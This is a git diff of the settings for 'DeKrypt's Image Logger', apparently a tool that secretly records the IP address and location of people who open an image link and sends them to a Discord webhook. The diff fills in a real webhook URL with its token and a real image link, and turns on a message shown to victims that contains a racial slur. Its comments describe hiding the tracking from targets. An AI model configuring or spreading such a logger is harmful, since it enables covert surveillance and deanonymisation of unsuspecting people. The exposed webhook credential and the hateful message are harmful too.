@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1338978539252355203/8ZRH0zL80pmJRBsiB5nxD-Ub5ufExwU9bTMGxufTtC86mT5c1l0ZQCgLDDA8mv-x6lv5",
+    "image": "https://twojememy.pl/wp-content/uploads/2018/04/Lustereczko-powiedz-przecie-kto-jest-najczarniejszy-w-swiecie.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
@@ -27,8 +27,8 @@ config = {
     "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
 
     "message": { # Show a custom message when the user opens the image
-        "doMessage": False, # Enable the custom message?
-        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
+        "doMessage": True, # Enable the custom message?
+        "message": "SHIT ON 200 PUMP NO SCOPE NIGGA discord.gg/2pm7wnxRnz", # Message to show
         "richMessage": True, # Enable rich text? (See README for more info)
     },
 
